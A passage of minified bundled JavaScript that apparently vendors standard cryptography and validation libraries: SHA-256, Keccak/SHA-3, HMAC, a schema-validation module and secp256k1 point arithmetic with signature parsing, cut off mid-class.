                    Be = new Uint32Array([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298]),
                    Te = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225]),
                    Oe = new Uint32Array(64);
                class Ce extends d {
                    constructor() {
                        super(64, 32, 8, !1), this.A = 0 | Te[0], this.B = 0 | Te[1], this.C = 0 | Te[2], this.D = 0 | Te[3], this.E = 0 | Te[4], this.F = 0 | Te[5], this.G = 0 | Te[6], this.H = 0 | Te[7]
                    }
                    get() {
                        const {
                            A: e,
                            B: t,
                            C: n,
                            D: r,
                            E: i,
                            F: o,
                            G: s,
                            H: a
                        } = this;
                        return [e, t, n, r, i, o, s, a]
                    }
                    set(e, t, n, r, i, o, s, a) {
                        this.A = 0 | e, this.B = 0 | t, this.C = 0 | n, this.D = 0 | r, this.E = 0 | i, this.F = 0 | o, this.G = 0 | s, this.H = 0 | a
                    }
                    process(e, t) {
                        for (let c = 0; c < 16; c++, t += 4) Oe[c] = e.getUint32(t, !1);
                        for (let h = 16; h < 64; h++) {
                            const e = Oe[h - 15],
                                t = Oe[h - 2],
                                n = c(e, 7) ^ c(e, 18) ^ e >>> 3,
                                r = c(t, 17) ^ c(t, 19) ^ t >>> 10;
                            Oe[h] = r + Oe[h - 7] + n + Oe[h - 16] | 0
                        }
                        let {
                            A: n,
                            B: r,
                            C: i,
                            D: o,
                            E: s,
                            F: a,
                            G: u,
                            H: l
                        } = this;
                        for (let h = 0; h < 64; h++) {
                            const e = l + (c(s, 6) ^ c(s, 11) ^ c(s, 25)) + ((f = s) & a ^ ~f & u) + Be[h] + Oe[h] | 0,
                                t = (c(n, 2) ^ c(n, 13) ^ c(n, 22)) + Me(n, r, i) | 0;
                            l = u, u = a, a = s, s = o + e | 0, o = i, i = r, r = n, n = e + t | 0
                        }
                        var f;
                        n = n + this.A | 0, r = r + this.B | 0, i = i + this.C | 0, o = o + this.D | 0, s = s + this.E | 0, a = a + this.F | 0, u = u + this.G | 0, l = l + this.H | 0, this.set(n, r, i, o, s, a, u, l)
                    }
                    roundClean() {
                        Oe.fill(0)
                    }
                    destroy() {
                        this.set(0, 0, 0, 0, 0, 0, 0, 0), this.buffer.fill(0)
                    }
                }
                const Pe = h((() => new Ce));
                var Le = n(5127),
                    Ne = n(2576),
                    Re = n(6070);
                class De extends TypeError {
                    constructor(e, t) {
                        let n;
                        const {
                            message: r,
                            ...i
                        } = e, {
                            path: o
                        } = e;
                        super(0 === o.length ? r : "At path: " + o.join(".") + " -- " + r), Object.assign(this, i), this.name = this.constructor.name, this.failures = () => {
                            var r;
                            return null != (r = n) ? r : n = [e, ...t()]
                        }
                    }
                }

                function ze(e) {
                    return "object" === typeof e && null != e
                }

                function Ue(e) {
                    return "string" === typeof e ? JSON.stringify(e) : "" + e
                }

                function je(e) {
                    const {
                        done: t,
                        value: n
                    } = e.next();
                    return t ? void 0 : n
                }

                function Fe(e, t, n, r) {
                    if (!0 === e) return;
                    !1 === e ? e = {} : "string" === typeof e && (e = {
                        message: e
                    });
                    const {
                        path: i,
                        branch: o
                    } = t, {
                        type: s
                    } = n, {
                        refinement: a,
                        message: u = "Expected a value of type `" + s + "`" + (a ? " with refinement `" + a + "`" : "") + ", but received: `" + Ue(r) + "`"
                    } = e;
                    return {
                        value: r,
                        type: s,
                        refinement: a,
                        key: i[i.length - 1],
                        path: i,
                        branch: o,
                        ...e,
                        message: u
                    }
                }

                function* He(e, t, n, r) {
                    var i;
                    ze(i = e) && "function" === typeof i[Symbol.iterator] || (e = [e]);
                    for (const o of e) {
                        const e = Fe(o, t, n, r);
                        e && (yield e)
                    }
                }

                function* We(e, t) {
                    let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                    const {
                        path: r = [],
                        branch: i = [e],
                        coerce: o = !1,
                        mask: s = !1
                    } = n, a = {
                        path: r,
                        branch: i
                    };
                    if (o && (e = t.coercer(e, a), s && "type" !== t.type && ze(t.schema) && ze(e) && !Array.isArray(e)))
                        for (const c in e) void 0 === t.schema[c] && delete e[c];
                    let u = !0;
                    for (const c of t.validator(e, a)) u = !1, yield [c, void 0];
                    for (let [c, l, f] of t.entries(e, a)) {
                        const t = We(l, f, {
                            path: void 0 === c ? r : [...r, c],
                            branch: void 0 === c ? i : [...i, l],
                            coerce: o,
                            mask: s
                        });
                        for (const n of t) n[0] ? (u = !1, yield [n[0], void 0]) : o && (l = n[1], void 0 === c ? e = l : e instanceof Map ? e.set(c, l) : e instanceof Set ? e.add(l) : ze(e) && (e[c] = l))
                    }
                    if (u)
                        for (const c of t.refiner(e, a)) u = !1, yield [c, void 0];
                    u && (yield [void 0, e])
                }
                class Ke {
                    constructor(e) {
                        const {
                            type: t,
                            schema: n,
                            validator: r,
                            refiner: i,
                            coercer: o = (e => e),
                            entries: s = function*() {}
                        } = e;
                        this.type = t, this.schema = n, this.entries = s, this.coercer = o, this.validator = r ? (e, t) => He(r(e, t), t, this, e) : () => [], this.refiner = i ? (e, t) => He(i(e, t), t, this, e) : () => []
                    }
                    assert(e) {
                        return qe(e, this)
                    }
                    create(e) {
                        return Ve(e, this)
                    }
                    is(e) {
                        return Qe(e, this)
                    }
                    mask(e) {
                        return function(e, t) {
                            const n = Ge(e, t, {
                                coerce: !0,
                                mask: !0
                            });
                            if (n[0]) throw n[0];
                            return n[1]
                        }(e, this)
                    }
                    validate(e) {
                        return Ge(e, this, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {})
                    }
                }

                function qe(e, t) {
                    const n = Ge(e, t);
                    if (n[0]) throw n[0]
                }

                function Ve(e, t) {
                    const n = Ge(e, t, {
                        coerce: !0
                    });
                    if (n[0]) throw n[0];
                    return n[1]
                }

                function Qe(e, t) {
                    return !Ge(e, t)[0]
                }

                function Ge(e, t) {
                    let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                    const r = We(e, t, n),
                        i = je(r);
                    if (i[0]) {
                        return [new De(i[0], (function*() {
                            for (const e of r) e[0] && (yield e[0])
                        })), void 0]
                    }
                    return [void 0, i[1]]
                }

                function Ye(e, t) {
                    return new Ke({
                        type: e,
                        schema: null,
                        validator: t
                    })
                }

                function Ze(e) {
                    return new Ke({
                        type: "array",
                        schema: e,
                        * entries(t) {
                            if (e && Array.isArray(t))
                                for (const [n, r] of t.entries()) yield [n, r, e]
                        },
                        coercer: e => Array.isArray(e) ? e.slice() : e,
                        validator: e => Array.isArray(e) || "Expected an array value, but received: " + Ue(e)
                    })
                }

                function Je() {
                    return Ye("boolean", (e => "boolean" === typeof e))
                }

                function Xe(e) {
                    return Ye("instance", (t => t instanceof e || "Expected a `" + e.name + "` instance, but received: " + Ue(t)))
                }

                function $e(e) {
                    const t = Ue(e),
                        n = typeof e;
                    return new Ke({
                        type: "literal",
                        schema: "string" === n || "number" === n || "boolean" === n ? e : null,
                        validator: n => n === e || "Expected the literal `" + t + "`, but received: " + Ue(n)
                    })
                }

                function et() {
                    return Ye("never", (() => !1))
                }

                function tt(e) {
                    return new Ke({ ...e,
                        validator: (t, n) => null === t || e.validator(t, n),
                        refiner: (t, n) => null === t || e.refiner(t, n)
                    })
                }

                function nt() {
                    return Ye("number", (e => "number" === typeof e && !isNaN(e) || "Expected a number, but received: " + Ue(e)))
                }

                function rt(e) {
                    return new Ke({ ...e,
                        validator: (t, n) => void 0 === t || e.validator(t, n),
                        refiner: (t, n) => void 0 === t || e.refiner(t, n)
                    })
                }

                function it(e, t) {
                    return new Ke({
                        type: "record",
                        schema: null,
                        * entries(n) {
                            if (ze(n))
                                for (const r in n) {
                                    const i = n[r];
                                    yield [r, r, e], yield [r, i, t]
                                }
                        },
                        validator: e => ze(e) || "Expected an object, but received: " + Ue(e)
                    })
                }

                function ot() {
                    return Ye("string", (e => "string" === typeof e || "Expected a string, but received: " + Ue(e)))
                }

                function st(e) {
                    const t = et();
                    return new Ke({
                        type: "tuple",
                        schema: null,
                        * entries(n) {
                            if (Array.isArray(n)) {
                                const r = Math.max(e.length, n.length);
                                for (let i = 0; i < r; i++) yield [i, n[i], e[i] || t]
                            }
                        },
                        validator: e => Array.isArray(e) || "Expected an array, but received: " + Ue(e)
                    })
                }

                function at(e) {
                    const t = Object.keys(e);
                    return new Ke({
                        type: "type",
                        schema: e,
                        * entries(n) {
                            if (ze(n))
                                for (const r of t) yield [r, n[r], e[r]]
                        },
                        validator: e => ze(e) || "Expected an object, but received: " + Ue(e)
                    })
                }

                function ut(e) {
                    const t = e.map((e => e.type)).join(" | ");
                    return new Ke({
                        type: "union",
                        schema: null,
                        validator(n, r) {
                            const i = [];
                            for (const t of e) {
                                const [...e] = We(n, t, r), [o] = e;
                                if (!o[0]) return [];
                                for (const [t] of e) t && i.push(t)
                            }
                            return ["Expected the value to satisfy a union of `" + t + "`, but received: " + Ue(n), ...i]
                        }
                    })
                }

                function ct() {
                    return Ye("unknown", (() => !0))
                }

                function lt(e, t, n) {
                    return new Ke({ ...e,
                        coercer: (r, i) => Qe(r, t) ? e.coercer(n(r, i), i) : e.coercer(r, i)
                    })
                }
                var ft = n(4876),
                    ht = n(9976),
                    dt = n.n(ht);
                const [pt, yt, gt] = [
                    [],
                    [],
                    []
                ], mt = BigInt(0), wt = BigInt(1), bt = BigInt(2), vt = BigInt(7), At = BigInt(256), kt = BigInt(113);
                for (let ms = 0, ws = wt, bs = 1, vs = 0; ms < 24; ms++) {
                    [bs, vs] = [vs, (2 * bs + 3 * vs) % 5], pt.push(2 * (5 * vs + bs)), yt.push((ms + 1) * (ms + 2) / 2 % 64);
                    let e = mt;
                    for (let t = 0; t < 7; t++) ws = (ws << wt ^ (ws >> vt) * kt) % At, ws & bt && (e ^= wt << (wt << BigInt(t)) - wt);
                    gt.push(e)
                }
                const [_t, Et] = m.split(gt, !0), St = (e, t, n) => n > 32 ? m.rotlBH(e, t, n) : m.rotlSH(e, t, n), It = (e, t, n) => n > 32 ? m.rotlBL(e, t, n) : m.rotlSL(e, t, n);
                class xt extends f {
                    constructor(e, t, n) {
                        let r = arguments.length > 3 && void 0 !== arguments[3] && arguments[3],
                            i = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : 24;
                        if (super(), this.blockLen = e, this.suffix = t, this.outputLen = n, this.enableXOF = r, this.rounds = i, this.pos = 0, this.posOut = 0, this.finished = !1, this.destroyed = !1, a.number(n), 0 >= this.blockLen || this.blockLen >= 200) throw new Error("Sha3 supports only keccak-f1600 function");
                        var o;
                        this.state = new Uint8Array(200), this.state32 = (o = this.state, new Uint32Array(o.buffer, o.byteOffset, Math.floor(o.byteLength / 4)))
                    }
                    keccak() {
                        ! function(e) {
                            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 24;
                            const n = new Uint32Array(10);
                            for (let r = 24 - t; r < 24; r++) {
                                for (let r = 0; r < 10; r++) n[r] = e[r] ^ e[r + 10] ^ e[r + 20] ^ e[r + 30] ^ e[r + 40];
                                for (let r = 0; r < 10; r += 2) {
                                    const t = (r + 8) % 10,
                                        i = (r + 2) % 10,
                                        o = n[i],
                                        s = n[i + 1],
                                        a = St(o, s, 1) ^ n[t],
                                        u = It(o, s, 1) ^ n[t + 1];
                                    for (let n = 0; n < 50; n += 10) e[r + n] ^= a, e[r + n + 1] ^= u
                                }
                                let t = e[2],
                                    i = e[3];
                                for (let n = 0; n < 24; n++) {
                                    const r = yt[n],
                                        o = St(t, i, r),
                                        s = It(t, i, r),
                                        a = pt[n];
                                    t = e[a], i = e[a + 1], e[a] = o, e[a + 1] = s
                                }
                                for (let r = 0; r < 50; r += 10) {
                                    for (let t = 0; t < 10; t++) n[t] = e[r + t];
                                    for (let t = 0; t < 10; t++) e[r + t] ^= ~n[(t + 2) % 10] & n[(t + 4) % 10]
                                }
                                e[0] ^= _t[r], e[1] ^= Et[r]
                            }
                            n.fill(0)
                        }(this.state32, this.rounds), this.posOut = 0, this.pos = 0
                    }
                    update(e) {
                        a.exists(this);
                        const {
                            blockLen: t,
                            state: n
                        } = this, r = (e = l(e)).length;
                        for (let i = 0; i < r;) {
                            const o = Math.min(t - this.pos, r - i);
                            for (let t = 0; t < o; t++) n[this.pos++] ^= e[i++];
                            this.pos === t && this.keccak()
                        }
                        return this
                    }
                    finish() {
                        if (this.finished) return;
                        this.finished = !0;
                        const {
                            state: e,
                            suffix: t,
                            pos: n,
                            blockLen: r
                        } = this;
                        e[n] ^= t, 0 !== (128 & t) && n === r - 1 && this.keccak(), e[r - 1] ^= 128, this.keccak()
                    }
                    writeInto(e) {
                        a.exists(this, !1), a.bytes(e), this.finish();
                        const t = this.state,
                            {
                                blockLen: n
                            } = this;
                        for (let r = 0, i = e.length; r < i;) {
                            this.posOut >= n && this.keccak();
                            const o = Math.min(n - this.posOut, i - r);
                            e.set(t.subarray(this.posOut, this.posOut + o), r), this.posOut += o, r += o
                        }
                        return e
                    }
                    xofInto(e) {
                        if (!this.enableXOF) throw new Error("XOF is not possible for this instance");
                        return this.writeInto(e)
                    }
                    xof(e) {
                        return a.number(e), this.xofInto(new Uint8Array(e))
                    }
                    digestInto(e) {
                        if (a.output(e, this), this.finished) throw new Error("digest() was already called");
                        return this.writeInto(e), this.destroy(), e
                    }
                    digest() {
                        return this.digestInto(new Uint8Array(this.outputLen))
                    }
                    destroy() {
                        this.destroyed = !0, this.state.fill(0)
                    }
                    _cloneInto(e) {
                        const {
                            blockLen: t,
                            suffix: n,
                            outputLen: r,
                            rounds: i,
                            enableXOF: o
                        } = this;
                        return e || (e = new xt(t, n, r, o, i)), e.state32.set(this.state32), e.pos = this.pos, e.posOut = this.posOut, e.finished = this.finished, e.rounds = i, e.suffix = n, e.outputLen = r, e.enableXOF = o, e.destroyed = this.destroyed, e
                    }
                }
                const Mt = (e, t, n) => h((() => new xt(t, e, n))),
                    Bt = (Mt(6, 144, 28), Mt(6, 136, 32), Mt(6, 104, 48), Mt(6, 72, 64), Mt(1, 144, 28), Mt(1, 136, 32)),
                    Tt = (Mt(1, 104, 48), Mt(1, 72, 64), (e, t, n) => function(e) {
                        const t = (t, n) => e(n).update(l(t)).digest(),
                            n = e({});
                        return t.outputLen = n.outputLen, t.blockLen = n.blockLen, t.create = t => e(t), t
                    }((function() {
                        let r = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                        return new xt(t, e, void 0 === r.dkLen ? n : r.dkLen, !0)
                    })));
                Tt(31, 168, 16), Tt(31, 136, 32);
                class Ot extends f {
                    constructor(e, t) {
                        super(), this.finished = !1, this.destroyed = !1, a.hash(e);
                        const n = l(t);
                        if (this.iHash = e.create(), !(this.iHash instanceof f)) throw new TypeError("Expected instance of class which extends utils.Hash");
                        const r = this.blockLen = this.iHash.blockLen;
                        this.outputLen = this.iHash.outputLen;
                        const i = new Uint8Array(r);
                        i.set(n.length > this.iHash.blockLen ? e.create().update(n).digest() : n);
                        for (let o = 0; o < i.length; o++) i[o] ^= 54;
                        this.iHash.update(i), this.oHash = e.create();
                        for (let o = 0; o < i.length; o++) i[o] ^= 106;
                        this.oHash.update(i), i.fill(0)
                    }
                    update(e) {
                        return a.exists(this), this.iHash.update(e), this
                    }
                    digestInto(e) {
                        a.exists(this), a.bytes(e, this.outputLen), this.finished = !0, this.iHash.digestInto(e), this.oHash.update(e), this.oHash.digestInto(e), this.destroy()
                    }
                    digest() {
                        const e = new Uint8Array(this.oHash.outputLen);
                        return this.digestInto(e), e
                    }
                    _cloneInto(e) {
                        e || (e = Object.create(Object.getPrototypeOf(this), {}));
                        const {
                            oHash: t,
                            iHash: n,
                            finished: r,
                            destroyed: i,
                            blockLen: o,
                            outputLen: s
                        } = this;
                        return e.finished = r, e.destroyed = i, e.blockLen = o, e.outputLen = s, e.oHash = t._cloneInto(e.oHash), e.iHash = n._cloneInto(e.iHash), e
                    }
                    destroy() {
                        this.destroyed = !0, this.oHash.destroy(), this.iHash.destroy()
                    }
                }
                const Ct = (e, t, n) => new Ot(e, t).update(n).digest();
                Ct.create = (e, t) => new Ot(e, t);
                var Pt = n(5856),
                    Lt = n.t(Pt, 2);
                const Nt = BigInt(0),
                    Rt = BigInt(1),
                    Dt = BigInt(2),
                    zt = BigInt(3),
                    Ut = BigInt(8),
                    jt = Dt ** BigInt(256),
                    Ft = {
                        a: Nt,
                        b: BigInt(7),
                        P: jt - Dt ** BigInt(32) - BigInt(977),
                        n: jt - BigInt("432420386565659656852420866394968145599"),
                        h: Rt,
                        Gx: BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),
                        Gy: BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),
                        beta: BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee")
                    };

                function Ht(e) {
                    const {
                        a: t,
                        b: n
                    } = Ft, r = cn(e * e), i = cn(r * e);
                    return cn(i + t * e + n)
                }
                const Wt = Ft.a === Nt;
                class Kt {
                    constructor(e, t, n) {
                        this.x = e, this.y = t, this.z = n
                    }
                    static fromAffine(e) {
                        if (!(e instanceof Vt)) throw new TypeError("JacobianPoint#fromAffine: expected Point");
                        return new Kt(e.x, e.y, Rt)
                    }
                    static toAffineBatch(e) {
                        const t = function(e) {
                            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Ft.P;
                            const n = new Array(e.length),
                                r = fn(e.reduce(((e, r, i) => r === Nt ? e : (n[i] = e, cn(e * r, t))), Rt), t);
                            return e.reduceRight(((e, r, i) => r === Nt ? e : (n[i] = cn(e * n[i], t), cn(e * r, t))), r), n
                        }(e.map((e => e.z)));
                        return e.map(((e, n) => e.toAffine(t[n])))
                    }
                    static normalizeZ(e) {
                        return Kt.toAffineBatch(e).map(Kt.fromAffine)
                    }
                    equals(e) {
                        if (!(e instanceof Kt)) throw new TypeError("JacobianPoint expected");
                        const {
                            x: t,
                            y: n,
                            z: r
                        } = this, {
                            x: i,
                            y: o,
                            z: s
                        } = e, a = cn(r ** Dt), u = cn(s ** Dt), c = cn(t * u), l = cn(i * a), f = cn(cn(n * s) * u), h = cn(cn(o * r) * a);
                        return c === l && f === h
                    }
                    negate() {
                        return new Kt(this.x, cn(-this.y), this.z)
                    }
                    double() {
                        const {
                            x: e,
                            y: t,
                            z: n
                        } = this, r = cn(e ** Dt), i = cn(t ** Dt), o = cn(i ** Dt), s = cn(Dt * (cn((e + i) ** Dt) - r - o)), a = cn(zt * r), u = cn(a ** Dt), c = cn(u - Dt * s), l = cn(a * (s - c) - Ut * o), f = cn(Dt * t * n);
                        return new Kt(c, l, f)
                    }
                    add(e) {
                        if (!(e instanceof Kt)) throw new TypeError("JacobianPoint expected");
                        const {
                            x: t,
                            y: n,
                            z: r
                        } = this, {
                            x: i,
                            y: o,
                            z: s
                        } = e;
                        if (i === Nt || o === Nt) return this;
                        if (t === Nt || n === Nt) return e;
                        const a = cn(r ** Dt),
                            u = cn(s ** Dt),
                            c = cn(t * u),
                            l = cn(i * a),
                            f = cn(cn(n * s) * u),
                            h = cn(cn(o * r) * a),
                            d = cn(l - c),
                            p = cn(h - f);
                        if (d === Nt) return p === Nt ? this.double() : Kt.ZERO;
                        const y = cn(d ** Dt),
                            g = cn(d * y),
                            m = cn(c * y),
                            w = cn(p ** Dt - g - Dt * m),
                            b = cn(p * (m - w) - f * g),
                            v = cn(r * s * d);
                        return new Kt(w, b, v)
                    }
                    subtract(e) {
                        return this.add(e.negate())
                    }
                    multiplyUnsafe(e) {
                        const t = Kt.ZERO;
                        if ("bigint" === typeof e && e === Nt) return t;
                        let n = un(e);
                        if (n === Rt) return this;
                        if (!Wt) {
                            let e = t,
                                r = this;
                            for (; n > Nt;) n & Rt && (e = e.add(r)), r = r.double(), n >>= Rt;
                            return e
                        }
                        let {
                            k1neg: r,
                            k1: i,
                            k2neg: o,
                            k2: s
                        } = pn(n), a = t, u = t, c = this;
                        for (; i > Nt || s > Nt;) i & Rt && (a = a.add(c)), s & Rt && (u = u.add(c)), c = c.double(), i >>= Rt, s >>= Rt;
                        return r && (a = a.negate()), o && (u = u.negate()), u = new Kt(cn(u.x * Ft.beta), u.y, u.z), a.add(u)
                    }
                    precomputeWindow(e) {
                        const t = Wt ? 128 / e + 1 : 256 / e + 1,
                            n = [];
                        let r = this,
                            i = r;
                        for (let o = 0; o < t; o++) {
                            i = r, n.push(i);
                            for (let t = 1; t < 2 ** (e - 1); t++) i = i.add(r), n.push(i);
                            r = i.double()
                        }
                        return n
                    }
                    wNAF(e, t) {
                        !t && this.equals(Kt.BASE) && (t = Vt.BASE);
                        const n = t && t._WINDOW_SIZE || 1;
                        if (256 % n) throw new Error("Point#wNAF: Invalid precomputation window, must be power of 2");
                        let r = t && qt.get(t);
                        r || (r = this.precomputeWindow(n), t && 1 !== n && (r = Kt.normalizeZ(r), qt.set(t, r)));
                        let i = Kt.ZERO,
                            o = Kt.ZERO;
                        const s = 1 + (Wt ? 128 / n : 256 / n),
                            a = 2 ** (n - 1),
                            u = BigInt(2 ** n - 1),
                            c = 2 ** n,
                            l = BigInt(n);
                        for (let f = 0; f < s; f++) {
                            const t = f * a;
                            let n = Number(e & u);
                            if (e >>= l, n > a && (n -= c, e += Rt), 0 === n) {
                                let e = r[t];
                                f % 2 && (e = e.negate()), o = o.add(e)
                            } else {
                                let e = r[t + Math.abs(n) - 1];
                                n < 0 && (e = e.negate()), i = i.add(e)
                            }
                        }
                        return {
                            p: i,
                            f: o
                        }
                    }
                    multiply(e, t) {
                        let n, r, i = un(e);
                        if (Wt) {
                            const {
                                k1neg: e,
                                k1: o,
                                k2neg: s,
                                k2: a
                            } = pn(i);
                            let {
                                p: u,
                                f: c
                            } = this.wNAF(o, t), {
                                p: l,
                                f: f
                            } = this.wNAF(a, t);
                            e && (u = u.negate()), s && (l = l.negate()), l = new Kt(cn(l.x * Ft.beta), l.y, l.z), n = u.add(l), r = c.add(f)
                        } else {
                            const {
                                p: e,
                                f: o
                            } = this.wNAF(i, t);
                            n = e, r = o
                        }
                        return Kt.normalizeZ([n, r])[0]
                    }
                    toAffine() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : fn(this.z);
                        const {
                            x: t,
                            y: n,
                            z: r
                        } = this, i = e, o = cn(i * i), s = cn(o * i), a = cn(t * o), u = cn(n * s);
                        if (cn(r * i) !== Rt) throw new Error("invZ was invalid");
                        return new Vt(a, u)
                    }
                }
                Kt.BASE = new Kt(Ft.Gx, Ft.Gy, Rt), Kt.ZERO = new Kt(Nt, Rt, Nt);
                const qt = new WeakMap;
                class Vt {
                    constructor(e, t) {
                        this.x = e, this.y = t
                    }
                    _setWindowSize(e) {
                        this._WINDOW_SIZE = e, qt.delete(this)
                    }
                    static fromCompressedHex(e) {
                        const t = 32 === e.length,
                            n = sn(t ? e : e.subarray(1));
                        if (!wn(n)) throw new Error("Point is not on curve");
                        let r = function(e) {
                            const {
                                P: t
                            } = Ft, n = BigInt(6), r = BigInt(11), i = BigInt(22), o = BigInt(23), s = BigInt(44), a = BigInt(88), u = e * e * e % t, c = u * u * e % t, l = ln(c, zt) * c % t, f = ln(l, zt) * c % t, h = ln(f, Dt) * u % t, d = ln(h, r) * h % t, p = ln(d, i) * d % t, y = ln(p, s) * p % t, g = ln(y, a) * y % t, m = ln(g, s) * p % t, w = ln(m, zt) * c % t, b = ln(w, o) * d % t, v = ln(b, n) * u % t;
                            return ln(v, Dt)
                        }(Ht(n));
                        const i = (r & Rt) === Rt;
                        if (t) i && (r = cn(-r));
                        else {
                            1 === (1 & e[0]) !== i && (r = cn(-r))
                        }
                        const o = new Vt(n, r);
                        return o.assertValidity(), o
                    }
                    static fromUncompressedHex(e) {
                        const t = sn(e.subarray(1, 33)),
                            n = sn(e.subarray(33, 65)),
                            r = new Vt(t, n);
                        return r.assertValidity(), r
                    }
                    static fromHex(e) {
                        const t = an(e),
                            n = t.length,
                            r = t[0];
                        if (32 === n || 33 === n && (2 === r || 3 === r)) return this.fromCompressedHex(t);
                        if (65 === n && 4 === r) return this.fromUncompressedHex(t);
                        throw new Error(`Point.fromHex: received invalid point. Expected 32-33 compressed bytes or 65 uncompressed bytes, not ${n}`)
                    }
                    static fromPrivateKey(e) {
                        return Vt.BASE.multiply(vn(e))
                    }
                    static fromSignature(e, t, n) {
                        const r = yn(e = an(e)),
                            {
                                r: i,
                                s: o
                            } = An(t);
                        if (0 !== n && 1 !== n) throw new Error("Cannot recover signature: invalid recovery bit");
                        const s = 1 & n ? "03" : "02",
                            a = Vt.fromHex(s + en(i)),
                            {
                                n: u
                            } = Ft,
                            c = fn(i, u),
                            l = cn(-r * c, u),
                            f = cn(o * c, u),
                            h = Vt.BASE.multiplyAndAddUnsafe(a, l, f);
                        if (!h) throw new Error("Cannot recover signature: point at infinify");
                        return h.assertValidity(), h
                    }
                    toRawBytes() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                        return on(this.toHex(e))
                    }
                    toHex() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                        const t = en(this.x);
                        if (e) {
                            return `${this.y&Rt?"03":"02"}${t}`
                        }
                        return `04${t}${en(this.y)}`
                    }
                    toHexX() {
                        return this.toHex(!0).slice(2)
                    }
                    toRawX() {
                        return this.toRawBytes(!0).slice(1)
                    }
                    assertValidity() {
                        const e = "Point is not on elliptic curve",
                            {
                                x: t,
                                y: n
                            } = this;
                        if (!wn(t) || !wn(n)) throw new Error(e);
                        const r = cn(n * n);
                        if (cn(r - Ht(t)) !== Nt) throw new Error(e)
                    }
                    equals(e) {
                        return this.x === e.x && this.y === e.y
                    }
                    negate() {
                        return new Vt(this.x, cn(-this.y))
                    }
                    double() {
                        return Kt.fromAffine(this).double().toAffine()
                    }
                    add(e) {
                        return Kt.fromAffine(this).add(Kt.fromAffine(e)).toAffine()
                    }
                    subtract(e) {
                        return this.add(e.negate())
                    }
                    multiply(e) {
                        return Kt.fromAffine(this).multiply(e, this).toAffine()
                    }
                    multiplyAndAddUnsafe(e, t, n) {
                        const r = Kt.fromAffine(this),
                            i = t === Nt || t === Rt || this !== Vt.BASE ? r.multiplyUnsafe(t) : r.multiply(t),
                            o = Kt.fromAffine(e).multiplyUnsafe(n),
                            s = i.add(o);
                        return s.equals(Kt.ZERO) ? void 0 : s.toAffine()
                    }
                }

                function Qt(e) {
                    return Number.parseInt(e[0], 16) >= 8 ? "00" + e : e
                }

                function Gt(e) {
                    if (e.length < 2 || 2 !== e[0]) throw new Error(`Invalid signature integer tag: ${$t(e)}`);
                    const t = e[1],
                        n = e.subarray(2, t + 2);
                    if (!t || n.length !== t) throw new Error("Invalid signature integer: wrong length");
                    if (0 === n[0] && n[1] <= 127) throw new Error("Invalid signature integer: trailing length");
                    return {
                        data: sn(n),
                        left: e.subarray(t + 2)
                    }
                }
                Vt.BASE = new Vt(Ft.Gx, Ft.Gy), Vt.ZERO = new Vt(Nt, Nt);
                class Yt {
                    constructor(e, t) {
                        this.r = e, this.s = t, this.assertValidity()
                    }
                    static fromCompact(e) {
                        const t = Jt(e),
                            n = "Signature.fromCompact";
                        if ("string" !== typeof e && !t) throw new TypeError(`${n}: Expected string or Uint8Array`);
                        const r = t ? $t(e) : e;
                        if (128 !== r.length) throw new Error(`${n}: Expected 64-byte hex`);
                        return new Yt(rn(r.slice(0, 64)), rn(r.slice(64, 128)))
                    }
                    static fromDER(e) {
                        const t = Jt(e);
                        if ("string" !== typeof e && !t) throw new TypeError("Signature.fromDER: Expected string or Uint8Array");
                        const {
                            r: n,
                            s: r
                        } = function(e) {
                            if (e.length < 2 || 48 != e[0]) throw new Error(`Invalid signature tag: ${$t(e)}`);
                            if (e[1] !== e.length - 2) throw new Error("Invalid signature: incorrect length");
                            const {
                                data: t,
                                left: n
                            } = Gt(e.subarray(2)), {
                                data: r,
                                left: i
                            } = Gt(n);
                            if (i.length) throw new Error(`Invalid signature: left bytes after parsing: ${$t(i)}`);
                            return {
                                r: t,
                                s: r
                            }
                        }(t ? e : on(e));
                        return new Yt(n, r)
                    }
                    static fromHex(e) {
                        return this.fromDER(e)
                    }
                    assertValidity() {
                        const {
                            r: e,
                            s: t
                        } = this;
                        if (!mn(e)) throw new Error("Invalid Signature: r must be 0 < r < n");
                        if (!mn(t)) throw new Error("Invalid Signature: s must be 0 < s < n")
                    }
                    hasHighS() {
                        const e = Ft.n >> Rt;
                        return this.s > e
                    }
                    normalizeS() {
                        return this.hasHighS() ? new Yt(this.r, Ft.n - this.s) : this
                    }
                    toDERRawBytes() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                        return on(this.toDERHex(e))
                    }
                    toDERHex() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                        const t = Qt(nn(this.s));
                        if (e) return t;
                        const n = Qt(nn(this.r)),
                            r = nn(n.length / 2),
                            i = nn(t.length / 2);
                        return `30${nn(n.length/2+t.length/2+4)}02${r}${n}02${i}${t}`
                    }
                    toRawBytes() {
                        return this.toDERRawBytes()
                    }
                    toHex() {
                        return this.toDERHex()
                    }
                    toCompactRawBytes() {
